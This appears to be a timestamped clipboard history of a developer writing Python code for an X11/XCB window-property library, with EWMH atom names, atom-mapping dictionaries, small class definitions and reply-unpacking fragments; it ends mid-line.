* Tue 18 Feb 2014 10:04:35 AM JST
'_NET_REQUEST_FRAME_EXTENTS'
* Tue 18 Feb 2014 10:05:19 AM JST
'_NET_WM_NAME'
* Tue 18 Feb 2014 10:05:22 AM JST
'_NET_WM_VISIBLE_NAME'
* Tue 18 Feb 2014 10:05:24 AM JST
'_NET_WM_ICON_NAME'
* Tue 18 Feb 2014 10:05:26 AM JST
'_NET_WM_VISIBLE_ICON_NAME'
* Tue 18 Feb 2014 10:05:28 AM JST
'_NET_WM_DESKTOP'
* Tue 18 Feb 2014 10:05:30 AM JST
'_NET_WM_WINDOW_TYPE'
* Tue 18 Feb 2014 10:05:32 AM JST
'_NET_WM_STATE'
* Tue 18 Feb 2014 10:05:34 AM JST
'_NET_WM_ALLOWED_ACTIONS'
* Tue 18 Feb 2014 10:05:36 AM JST
'_NET_WM_STRUT'
* Tue 18 Feb 2014 10:05:39 AM JST
'_NET_WM_STRUT_PARTIAL'
* Tue 18 Feb 2014 10:05:40 AM JST
'_NET_WM_ICON_GEOMETRY'
* Tue 18 Feb 2014 10:05:42 AM JST
'_NET_WM_ICON'
* Tue 18 Feb 2014 10:05:44 AM JST
'_NET_WM_PID'
* Tue 18 Feb 2014 10:05:45 AM JST
'_NET_WM_HANDLED_ICONS'
* Tue 18 Feb 2014 10:05:48 AM JST
'_NET_WM_USER_TIME'
* Tue 18 Feb 2014 10:05:50 AM JST
'_NET_FRAME_EXTENTS'
* Tue 18 Feb 2014 10:05:53 AM JST
'_OB_APP_TYPE'
* Tue 18 Feb 2014 10:06:16 AM JST
    
* Tue 18 Feb 2014 10:06:18 AM JST
    
* Tue 18 Feb 2014 10:07:21 AM JST
        
* Tue 18 Feb 2014 10:09:09 AM JST
    
* Tue 18 Feb 2014 10:43:51 AM JST
    
* Tue 18 Feb 2014 10:57:23 AM JST
'_NET_WM_WINDOW_TYPE_DESKTOP'
* Tue 18 Feb 2014 10:57:30 AM JST
'_NET_WM_WINDOW_TYPE_DOCK'
* Tue 18 Feb 2014 10:57:36 AM JST
'_NET_WM_WINDOW_TYPE_TOOLBAR'
* Tue 18 Feb 2014 10:57:37 AM JST
'_NET_WM_WINDOW_TYPE_MENU'
* Tue 18 Feb 2014 10:57:37 AM JST
'_NET_WM_WINDOW_TYPE_UTILITY'
* Tue 18 Feb 2014 10:57:37 AM JST
'_NET_WM_WINDOW_TYPE_SPLASH'
* Tue 18 Feb 2014 10:57:37 AM JST
'_NET_WM_WINDOW_TYPE_DIALOG'
* Tue 18 Feb 2014 10:57:37 AM JST
'_NET_WM_WINDOW_TYPE_DROPDOWN_MENU'
* Tue 18 Feb 2014 10:57:38 AM JST
'_NET_WM_WINDOW_TYPE_POPUP_MENU'
* Tue 18 Feb 2014 10:57:38 AM JST
'_NET_WM_WINDOW_TYPE_TOOLTIP'
* Tue 18 Feb 2014 10:57:38 AM JST
'_NET_WM_WINDOW_TYPE_NOTIFICATION'
* Tue 18 Feb 2014 10:57:39 AM JST
'_NET_WM_WINDOW_TYPE_COMBO'
* Tue 18 Feb 2014 10:57:39 AM JST
'_NET_WM_WINDOW_TYPE_DND'
* Tue 18 Feb 2014 10:57:40 AM JST
'_NET_WM_WINDOW_TYPE_NORMAL'
* Tue 18 Feb 2014 10:57:46 AM JST
'_NET_WM_STATE_MODAL'
* Tue 18 Feb 2014 10:57:47 AM JST
'_NET_WM_STATE_STICKY'
* Tue 18 Feb 2014 10:57:48 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 18 Feb 2014 10:57:48 AM JST
'_NET_WM_STATE_MAXIMIZED_HORZ'
* Tue 18 Feb 2014 10:57:49 AM JST
'_NET_WM_STATE_SHADED'
* Tue 18 Feb 2014 10:57:49 AM JST
'_NET_WM_STATE_SKIP_TASKBAR'
* Tue 18 Feb 2014 10:57:49 AM JST
'_NET_WM_STATE_SKIP_PAGER'
* Tue 18 Feb 2014 10:57:49 AM JST
'_NET_WM_STATE_HIDDEN'
* Tue 18 Feb 2014 10:57:49 AM JST
'_NET_WM_STATE_FULLSCREEN'
* Tue 18 Feb 2014 10:57:50 AM JST
'_NET_WM_STATE_ABOVE'
* Tue 18 Feb 2014 10:57:50 AM JST
'_NET_WM_STATE_BELOW'
* Tue 18 Feb 2014 10:57:51 AM JST
'_NET_WM_STATE_DEMANDS_ATTENTION'
* Tue 18 Feb 2014 10:57:55 AM JST
'_NET_WM_ACTION_MOVE'
* Tue 18 Feb 2014 10:57:56 AM JST
'_NET_WM_ACTION_RESIZE'
* Tue 18 Feb 2014 10:57:56 AM JST
'_NET_WM_ACTION_MINIMIZE'
* Tue 18 Feb 2014 10:57:56 AM JST
'_NET_WM_ACTION_SHADE'
* Tue 18 Feb 2014 10:57:56 AM JST
'_NET_WM_ACTION_STICK'
* Tue 18 Feb 2014 10:57:56 AM JST
'_NET_WM_ACTION_MAXIMIZE_HORZ'
* Tue 18 Feb 2014 10:57:56 AM JST
'_NET_WM_ACTION_MAXIMIZE_VERT'
* Tue 18 Feb 2014 10:57:57 AM JST
'_NET_WM_ACTION_FULLSCREEN'
* Tue 18 Feb 2014 10:57:57 AM JST
'_NET_WM_ACTION_CHANGE_DESKTOP'
* Tue 18 Feb 2014 10:57:57 AM JST
'_NET_WM_ACTION_CLOSE'
* Tue 18 Feb 2014 10:57:57 AM JST
'_NET_WM_ACTION_ABOVE'
* Tue 18 Feb 2014 10:57:57 AM JST
'_NET_WM_ACTION_BELOW'
* Tue 18 Feb 2014 10:58:17 AM JST
    window_types = {
        '_NET_WM_WINDOW_TYPE_DESKTOP'       : PropertyInfo('_NET_WM_WINDOW_TYPE_DESKTOP', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_DOCK'          : PropertyInfo('_NET_WM_WINDOW_TYPE_DOCK', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_TOOLBAR'       : PropertyInfo('_NET_WM_WINDOW_TYPE_TOOLBAR', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_MENU'          : PropertyInfo('_NET_WM_WINDOW_TYPE_MENU', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_UTILITY'       : PropertyInfo('_NET_WM_WINDOW_TYPE_UTILITY', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_SPLASH'        : PropertyInfo('_NET_WM_WINDOW_TYPE_SPLASH', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_DIALOG'        : PropertyInfo('_NET_WM_WINDOW_TYPE_DIALOG', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_DROPDOWN_MENU' : PropertyInfo('_NET_WM_WINDOW_TYPE_DROPDOWN_MENU', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_POPUP_MENU'    : PropertyInfo('_NET_WM_WINDOW_TYPE_POPUP_MENU', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_TOOLTIP'       : PropertyInfo('_NET_WM_WINDOW_TYPE_TOOLTIP', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_NOTIFICATION'  : PropertyInfo('_NET_WM_WINDOW_TYPE_NOTIFICATION', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_COMBO'         : PropertyInfo('_NET_WM_WINDOW_TYPE_COMBO', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_DND'           : PropertyInfo('_NET_WM_WINDOW_TYPE_DND', 'ATOM', 32),
        '_NET_WM_WINDOW_TYPE_NORMAL'        : PropertyInfo('_NET_WM_WINDOW_TYPE_NORMAL', 'ATOM', 32)
    }

* Tue 18 Feb 2014 10:58:46 AM JST
                    
* Tue 18 Feb 2014 11:03:39 AM JST
                                  
* Tue 18 Feb 2014 11:03:45 AM JST
                                    
* Tue 18 Feb 2014 11:03:49 AM JST
                                    
* Tue 18 Feb 2014 11:03:52 AM JST
                                    
* Tue 18 Feb 2014 11:03:55 AM JST
                                    
* Tue 18 Feb 2014 11:03:58 AM JST
                                    
* Tue 18 Feb 2014 11:04:01 AM JST
                                    
* Tue 18 Feb 2014 11:04:03 AM JST
                                    
* Tue 18 Feb 2014 11:04:06 AM JST
                                    
* Tue 18 Feb 2014 11:04:08 AM JST
                                    
* Tue 18 Feb 2014 11:04:11 AM JST
                                    
* Tue 18 Feb 2014 11:04:13 AM JST
                                    
* Tue 18 Feb 2014 11:04:24 AM JST
                                    
* Tue 18 Feb 2014 11:05:00 AM JST
                                    
* Tue 18 Feb 2014 11:05:03 AM JST
                                    
* Tue 18 Feb 2014 11:05:05 AM JST
                                    
* Tue 18 Feb 2014 11:05:09 AM JST
                                    
* Tue 18 Feb 2014 11:05:11 AM JST
                                    
* Tue 18 Feb 2014 11:05:13 AM JST
                                    
* Tue 18 Feb 2014 11:05:16 AM JST
                                    
* Tue 18 Feb 2014 11:05:21 AM JST
                                    
* Tue 18 Feb 2014 11:05:24 AM JST
                                    
* Tue 18 Feb 2014 11:05:28 AM JST
PropertyInfo
* Tue 18 Feb 2014 11:05:32 AM JST
                                    
* Tue 18 Feb 2014 11:05:34 AM JST
                                    
* Tue 18 Feb 2014 11:05:44 AM JST
                                    
* Tue 18 Feb 2014 11:05:46 AM JST
                                    
* Tue 18 Feb 2014 11:05:48 AM JST
                                    
* Tue 18 Feb 2014 11:05:51 AM JST
                                    
* Tue 18 Feb 2014 11:06:16 AM JST
                                    
* Tue 18 Feb 2014 11:06:19 AM JST
                                 
* Tue 18 Feb 2014 11:06:28 AM JST
PropertyInfo
* Tue 18 Feb 2014 11:06:32 AM JST
                                    
* Tue 18 Feb 2014 11:06:35 AM JST
                                 
* Tue 18 Feb 2014 11:06:37 AM JST
                                    
* Tue 18 Feb 2014 11:06:40 AM JST
                                   
* Tue 18 Feb 2014 11:06:42 AM JST
                                   
* Tue 18 Feb 2014 11:06:46 AM JST
        
* Tue 18 Feb 2014 11:06:50 AM JST
        
* Tue 18 Feb 2014 11:06:52 AM JST
                                    
* Tue 18 Feb 2014 11:06:57 AM JST
        
* Tue 18 Feb 2014 11:07:00 AM JST
                                  
* Tue 18 Feb 2014 11:07:02 AM JST
                                
* Tue 18 Feb 2014 11:07:06 AM JST
                                   
* Tue 18 Feb 2014 11:07:51 AM JST
    window_states = {
        '_NET_WM_STATE_MODAL'             : ('_NET_WM_STATE_MODAL', 'ATOM', 32),
        '_NET_WM_STATE_STICKY'            : ('_NET_WM_STATE_STICKY', 'ATOM', 32),
        '_NET_WM_STATE_MAXIMIZED_VERT'    : ('_NET_WM_STATE_MAXIMIZED_VERT', 'ATOM', 32),
        '_NET_WM_STATE_MAXIMIZED_HORZ'    : ('_NET_WM_STATE_MAXIMIZED_HORZ', 'ATOM', 32),
        '_NET_WM_STATE_SHADED'            : ('_NET_WM_STATE_SHADED', 'ATOM', 32),
        '_NET_WM_STATE_SKIP_TASKBAR'      : ('_NET_WM_STATE_SKIP_TASKBAR', 'ATOM', 32),
        '_NET_WM_STATE_SKIP_PAGER'        : ('_NET_WM_STATE_SKIP_PAGER', 'ATOM', 32),
        '_NET_WM_STATE_HIDDEN'            : ('_NET_WM_STATE_HIDDEN', 'ATOM', 32),
        '_NET_WM_STATE_FULLSCREEN'        : ('_NET_WM_STATE_FULLSCREEN', 'ATOM', 32),
        '_NET_WM_STATE_ABOVE'             : ('_NET_WM_STATE_ABOVE', 'ATOM', 32),
        '_NET_WM_STATE_BELOW'             : ('_NET_WM_STATE_BELOW', 'ATOM', 32),
        '_NET_WM_STATE_DEMANDS_ATTENTION' : ('_NET_WM_STATE_DEMANDS_ATTENTION', 'ATOM', 32)
    }

    window_allowed_actions = {
        '_NET_WM_ACTION_MOVE'           : ('_NET_WM_ACTION_MOVE', 'ATOM', 32),
        '_NET_WM_ACTION_RESIZE'         : ('_NET_WM_ACTION_RESIZE', 'ATOM', 32),
        '_NET_WM_ACTION_MINIMIZE'       : ('_NET_WM_ACTION_MINIMIZE', 'ATOM', 32),
        '_NET_WM_ACTION_SHADE'          : ('_NET_WM_ACTION_SHADE', 'ATOM', 32),
        '_NET_WM_ACTION_STICK'          : ('_NET_WM_ACTION_STICK', 'ATOM', 32),
        '_NET_WM_ACTION_MAXIMIZE_HORZ'  : ('_NET_WM_ACTION_MAXIMIZE_HORZ', 'ATOM', 32),
        '_NET_WM_ACTION_MAXIMIZE_VERT'  : ('_NET_WM_ACTION_MAXIMIZE_VERT', 'ATOM', 32),
        '_NET_WM_ACTION_FULLSCREEN'     : ('_NET_WM_ACTION_FULLSCREEN', 'ATOM', 32),
        '_NET_WM_ACTION_CHANGE_DESKTOP' : ('_NET_WM_ACTION_CHANGE_DESKTOP', 'ATOM', 32),
        '_NET_WM_ACTION_CLOSE'          : ('_NET_WM_ACTION_CLOSE', 'ATOM', 32),
        '_NET_WM_ACTION_ABOVE'          : ('_NET_WM_ACTION_ABOVE', 'ATOM', 32),
        '_NET_WM_ACTION_BELOW'          : ('_NET_WM_ACTION_BELOW', 'ATOM', 32)
    }

* Tue 18 Feb 2014 11:08:23 AM JST
Atoms.
* Tue 18 Feb 2014 11:08:24 AM JST
Atoms.
* Tue 18 Feb 2014 11:08:24 AM JST
Atoms.
* Tue 18 Feb 2014 11:08:24 AM JST
Atoms.
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_DEMANDS_ATTENTION', 
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_BELOW',
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_ABOVE',
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_FULLSCREEN', 
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_HIDDEN',
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_SKIP_PAGER', 
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_SKIP_TASKBAR', 
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_SHADED',
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_MAXIMIZED_HORZ', 
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_MAXIMIZED_VERT', 
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_STICKY',
* Tue 18 Feb 2014 11:09:55 AM JST
_NET_WM_STATE_MODAL',
* Tue 18 Feb 2014 11:10:26 AM JST
_NET_WM_ACTION_BELOW', 
* Tue 18 Feb 2014 11:10:26 AM JST
_NET_WM_ACTION_ABOVE', 
* Tue 18 Feb 2014 11:10:26 AM JST
_NET_WM_ACTION_CLOSE', 
* Tue 18 Feb 2014 11:10:26 AM JST
_NET_WM_ACTION_CHANGE_DESKTOP', '
* Tue 18 Feb 2014 11:10:26 AM JST
_NET_WM_ACTION_FULLSCREEN', 
* Tue 18 Feb 2014 11:10:26 AM JST
_NET_WM_ACTION_MAXIMIZE_VERT', '
* Tue 18 Feb 2014 11:10:27 AM JST
_NET_WM_ACTION_MAXIMIZE_HORZ', '
* Tue 18 Feb 2014 11:10:27 AM JST
_NET_WM_ACTION_STICK', 
* Tue 18 Feb 2014 11:10:27 AM JST
_NET_WM_ACTION_SHADE', 
* Tue 18 Feb 2014 11:10:27 AM JST
_NET_WM_ACTION_MINIMIZE', 
* Tue 18 Feb 2014 11:10:27 AM JST
_NET_WM_ACTION_RESIZE', 
* Tue 18 Feb 2014 11:10:27 AM JST
_NET_WM_ACTION_MOVE', 
* Tue 18 Feb 2014 11:10:47 AM JST
GetProperty
* Tue 18 Feb 2014 11:14:33 AM JST
'_NET_WM_NAME'
* Tue 18 Feb 2014 11:15:58 AM JST
'_NET_WM_NAME'
* Tue 18 Feb 2014 11:19:31 AM JST
atom
* Tue 18 Feb 2014 11:20:48 AM JST
class PropertyInfo(object):
    r"""
    """
    __slots__ = ('name', 'type_', 'length')

    def __init__(self, connection, name, type_, length):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        - `type_`:
        - `length`:
        """
        self._connection = connection
        self.name = Atom(self._connection, name)
        self.type = Atom(self._connection, type_)
        self.length = length



* Tue 18 Feb 2014 11:24:12 AM JST
Atoms
* Tue 18 Feb 2014 11:24:19 AM JST

* Tue 18 Feb 2014 11:24:19 AM JST

* Tue 18 Feb 2014 11:24:19 AM JST
        self._connection = connection

* Tue 18 Feb 2014 11:24:23 AM JST
connection, 
* Tue 18 Feb 2014 11:24:28 AM JST
_connection, 
* Tue 18 Feb 2014 11:24:29 AM JST
self._connection, 
* Tue 18 Feb 2014 11:24:33 AM JST
_connection, 
* Tue 18 Feb 2014 11:24:33 AM JST
self._connection, 
* Tue 18 Feb 2014 11:24:34 AM JST
Atom(self._connection, 
* Tue 18 Feb 2014 11:24:40 AM JST
connection
* Tue 18 Feb 2014 11:24:45 AM JST

* Tue 18 Feb 2014 11:24:45 AM JST

* Tue 18 Feb 2014 11:24:45 AM JST
        self._connection = connection

* Tue 18 Feb 2014 11:24:52 AM JST
_connection, 
* Tue 18 Feb 2014 11:24:52 AM JST
self._connection, 
* Tue 18 Feb 2014 11:27:12 AM JST
self._info_holder
* Tue 18 Feb 2014 11:28:53 AM JST
connection
* Tue 18 Feb 2014 11:35:28 AM JST
_connection
* Tue 18 Feb 2014 11:35:43 AM JST
property
* Tue 18 Feb 2014 11:35:43 AM JST
self.property
* Tue 18 Feb 2014 11:36:11 AM JST
name
* Tue 18 Feb 2014 11:46:57 AM JST
name
* Tue 18 Feb 2014 11:47:03 AM JST
'{0:.__class__}(property={0:.property})'
* Tue 18 Feb 2014 12:00:19 PM JST
name
* Tue 18 Feb 2014 12:00:23 PM JST
name
* Tue 18 Feb 2014 12:00:27 PM JST
name
* Tue 18 Feb 2014 12:00:40 PM JST
name
* Tue 18 Feb 2014 12:00:45 PM JST
name
* Tue 18 Feb 2014 12:01:50 PM JST
    def __repr__(self, ):
        fmt = ('{0.__class__.__name__}('
               'property={0.property}, '
               'types={0.types}, '
               'length={0.length})').format
        return fmt(self)

* Tue 18 Feb 2014 12:03:32 PM JST
InfoBase
* Tue 18 Feb 2014 12:03:48 PM JST
__slots__ = ('property', 'types', 'length')
* Tue 18 Feb 2014 12:04:09 PM JST
class PropertyAtomInfo(object):
    r"""
    """
    __slots__ = ('property', 'types', 'length')

    def __init__(self, property_, types, length):
        r"""

        @Arguments:
        - `property_`:
        - `types`:
        - `length`:
        """
        self.property = property_
        self.types = types
        self.length = length


* Tue 18 Feb 2014 12:04:17 PM JST
object
* Tue 18 Feb 2014 12:04:46 PM JST
PropertyInfoBase
* Tue 18 Feb 2014 12:05:00 PM JST

class PropertyInfo(PropertyInfoBase):
    r"""
    """
    pass

* Tue 18 Feb 2014 12:05:43 PM JST
    
* Tue 18 Feb 2014 12:06:27 PM JST
name
* Tue 18 Feb 2014 12:08:48 PM JST
property
* Tue 18 Feb 2014 12:08:52 PM JST
types
* Tue 18 Feb 2014 12:18:50 PM JST
_info_holder
* Tue 18 Feb 2014 01:19:58 PM JST
65011735
* Tue 18 Feb 2014 01:23:22 PM JST
window_types
* Tue 18 Feb 2014 01:25:04 PM JST
_NET_WM_WINDOW_TYPE_DESKTOP
* Tue 18 Feb 2014 01:27:05 PM JST
65011735
* Tue 18 Feb 2014 01:27:28 PM JST
'_NET_WM_WINDOW_TYPE'
* Tue 18 Feb 2014 01:35:21 PM JST
81788973
* Tue 18 Feb 2014 01:39:24 PM JST
vlaue
* Tue 18 Feb 2014 01:39:44 PM JST
value
* Tue 18 Feb 2014 01:39:58 PM JST
list 
* Tue 18 Feb 2014 01:40:11 PM JST
print 
* Tue 18 Feb 2014 01:43:09 PM JST
atom
* Tue 18 Feb 2014 01:47:57 PM JST
    '_NET_WM_WINDOW_TYPE_DESKTOP': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DOCK': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_TOOLBAR': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_MENU': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_UTILITY': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_SPLASH': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DIALOG': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DROPDOWN_MENU': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_POPUP_MENU': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_TOOLTIP': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_NOTIFICATION': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_COMBO': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DND': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_NORMAL': ('ATOM', 32)

* Tue 18 Feb 2014 01:48:14 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:15 PM JST
'_NET_WM_
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32)
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
MENU': ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
MENU': ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:46 PM JST
: ('ATOM', 32),
* Tue 18 Feb 2014 01:48:53 PM JST
WindowTypeDesktop
* Tue 18 Feb 2014 01:49:25 PM JST
WindowDesktopType
* Tue 18 Feb 2014 01:50:13 PM JST
WindowDockType
* Tue 18 Feb 2014 01:50:24 PM JST
WindowToolbarType
* Tue 18 Feb 2014 01:50:33 PM JST
WindowMenuType
* Tue 18 Feb 2014 01:50:45 PM JST
WindowUtilityType
* Tue 18 Feb 2014 01:50:59 PM JST
WindowSplashType
* Tue 18 Feb 2014 01:51:11 PM JST
WindowDialogType
* Tue 18 Feb 2014 01:51:22 PM JST
WindowDropdownType
* Tue 18 Feb 2014 01:51:39 PM JST
WindowPopupType
* Tue 18 Feb 2014 01:51:53 PM JST
WindowTooltipType
* Tue 18 Feb 2014 01:52:09 PM JST
WindowNotificationType
* Tue 18 Feb 2014 01:52:20 PM JST
WindowComboType
* Tue 18 Feb 2014 01:52:34 PM JST
WindowDndType
* Tue 18 Feb 2014 01:52:54 PM JST
WindowNormalType
* Tue 18 Feb 2014 03:36:54 PM JST
Atom(cc, 309)
* Tue 18 Feb 2014 03:37:04 PM JST
'_NET_WM_WINDOW_TYPE_NORMAL'
* Tue 18 Feb 2014 03:41:16 PM JST
    def __cmp__(self, other):
        if isinstance(other, Atom):
            return cmp(self.num, other.num)
        if predicate.isstring(other):
            return cmp(self.name, other)
        if predicate.isint(other):
            return cmp(self.num, other)
        return False

* Tue 18 Feb 2014 03:41:33 PM JST
num
* Tue 18 Feb 2014 03:41:38 PM JST
num
* Tue 18 Feb 2014 03:42:09 PM JST
_data
* Tue 18 Feb 2014 03:42:09 PM JST
self._data
* Tue 18 Feb 2014 03:42:53 PM JST
    def __eq__(self, other):
        if isinstance(other, Atom):
            return self.num == other.num
        if predicate.isint(other):
            return self.num == other
        if predicate.isstring(other):
            return self.name == other
        return False

    def __ne__(self, other):
        return not (self == other)

* Tue 18 Feb 2014 03:45:03 PM JST
Atom
* Tue 18 Feb 2014 03:45:18 PM JST
Atom
* Tue 18 Feb 2014 03:45:50 PM JST

* Tue 18 Feb 2014 03:45:50 PM JST

* Tue 18 Feb 2014 03:45:50 PM JST
            print('DEBUG-1-atom.py')

* Tue 18 Feb 2014 03:46:04 PM JST
'_NET_WM_WINDOW_TYPE_NORMAL'
* Tue 18 Feb 2014 06:32:03 PM JST
xcb.xproto.GetPropertyReply
* Tue 18 Feb 2014 06:34:45 PM JST
GetPropertyReply
* Tue 18 Feb 2014 06:41:12 PM JST
81788973
* Tue 18 Feb 2014 06:42:29 PM JST
print 
* Tue 18 Feb 2014 06:43:50 PM JST
len(
* Tue 18 Feb 2014 06:46:28 PM JST
rep=c.core.GetProperty(False, 81788973, atom.Atom(cc, '_NET_WM_WINDOW_TYPE'), atom.Atom(cc, 'ATOM'), 0, 65535).reply()
* Tue 18 Feb 2014 06:55:39 PM JST
parent
* Tue 18 Feb 2014 06:56:37 PM JST

* Tue 18 Feb 2014 06:56:37 PM JST

* Tue 18 Feb 2014 06:56:37 PM JST
        print(type(parent))

* Tue 18 Feb 2014 07:01:30 PM JST
self.
* Wed 19 Feb 2014 05:45:15 AM JST
'_NET_WM_DESKTOP'
* Wed 19 Feb 2014 05:45:40 AM JST
81788974
* Wed 19 Feb 2014 05:45:57 AM JST
'_NET_WM_DESKTOP'
* Wed 19 Feb 2014 05:46:06 AM JST
'CARDINAL'
* Wed 19 Feb 2014 05:48:25 AM JST
'_NET_WM_WINDOW_TYPE'
* Wed 19 Feb 2014 05:48:40 AM JST
CARDINAL
* Wed 19 Feb 2014 05:54:50 AM JST
'_NET_WM_NAME'
* Wed 19 Feb 2014 05:56:59 AM JST
print 
* Wed 19 Feb 2014 05:57:23 AM JST
bytes_after
* Wed 19 Feb 2014 05:57:46 AM JST
get_atom_length
* Wed 19 Feb 2014 06:25:59 AM JST
ab
* Wed 19 Feb 2014 06:25:59 AM JST
import ab
* Wed 19 Feb 2014 06:32:54 AM JST
ReplyUTF8STRING
* Wed 19 Feb 2014 06:39:15 AM JST
_type_name
* Wed 19 Feb 2014 06:40:15 AM JST
atom
* Wed 19 Feb 2014 06:40:37 AM JST
klass._type_name
* Wed 19 Feb 2014 06:42:51 AM JST
reply.type
* Wed 19 Feb 2014 06:43:18 AM JST
return 
* Wed 19 Feb 2014 07:17:42 AM JST
Atom(self._connection, klass.type_name)
* Wed 19 Feb 2014 07:17:45 AM JST

* Wed 19 Feb 2014 07:17:45 AM JST

* Wed 19 Feb 2014 07:17:45 AM JST
            atom_num = 

* Wed 19 Feb 2014 07:18:02 AM JST
Atom(reply.type)
* Wed 19 Feb 2014 07:18:53 AM JST
self._connection, 
* Wed 19 Feb 2014 07:20:47 AM JST
'UTF8_STRING[]'
* Wed 19 Feb 2014 07:22:53 AM JST
        ret = []
        s = ''

        for o in ords:
            if not o:
                ret.append(s)
                s = ''
            else:
                s += chr(o)

        return ret

* Wed 19 Feb 2014 07:23:17 AM JST
ords
* Wed 19 Feb 2014 07:24:14 AM JST
'_NET_DESKTOP_NAMES'
* Wed 19 Feb 2014 07:27:02 AM JST
_NET_DESKTOP_NAMES
* Wed 19 Feb 2014 07:28:14 AM JST
his -g 
* Wed 19 Feb 2014 07:28:27 AM JST
/list 
* Wed 19 Feb 2014 07:30:52 AM JST

* Wed 19 Feb 2014 07:30:52 AM JST

* Wed 19 Feb 2014 07:30:53 AM JST
        self.type = 

* Wed 19 Feb 2014 07:50:08 AM JST
0x5e00001
* Wed 19 Feb 2014 07:50:15 AM JST

* Wed 19 Feb 2014 07:50:15 AM JST

* Wed 19 Feb 2014 07:50:15 AM JST

* Wed 19 Feb 2014 07:50:15 AM JST

* Wed 19 Feb 2014 07:50:15 AM JST

* Wed 19 Feb 2014 07:50:15 AM JST

* Wed 19 Feb 2014 07:50:33 AM JST
0x5e00001
* Wed 19 Feb 2014 07:50:46 AM JST
98566145
* Wed 19 Feb 2014 07:51:33 AM JST
'_NET_WM_WINDOW_TYPE'
* Wed 19 Feb 2014 07:53:10 AM JST
81788974
* Wed 19 Feb 2014 07:53:50 AM JST
UTF8_STRING[]
* Wed 19 Feb 2014 07:59:02 AM JST
ReplyTypesAbstract
* Wed 19 Feb 2014 07:59:14 AM JST
ReplyATOM
* Wed 19 Feb 2014 08:01:41 AM JST
struct.
* Wed 19 Feb 2014 08:06:03 AM JST
'WINDOW'
* Wed 19 Feb 2014 08:06:51 AM JST
WINDOW
* Wed 19 Feb 2014 08:07:20 AM JST
'WM_STATE'
* Wed 19 Feb 2014 08:07:36 AM JST
ATOM
* Wed 19 Feb 2014 08:19:39 AM JST
'_NET_WORKAREA'
* Wed 19 Feb 2014 08:21:41 AM JST
        return list(unpack('I' * self._reply.value_len,
                           self._reply.value.buf()))

* Wed 19 Feb 2014 08:22:04 AM JST
ReplyCARDINAL
* Wed 19 Feb 2014 08:25:43 AM JST
'_NET_ACTIVE_WINDOW'
* Wed 19 Feb 2014 08:28:27 AM JST
ReplyWindow
* Wed 19 Feb 2014 08:29:56 AM JST
    def get_result(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return list(unpack('I' * self._reply.value_len,
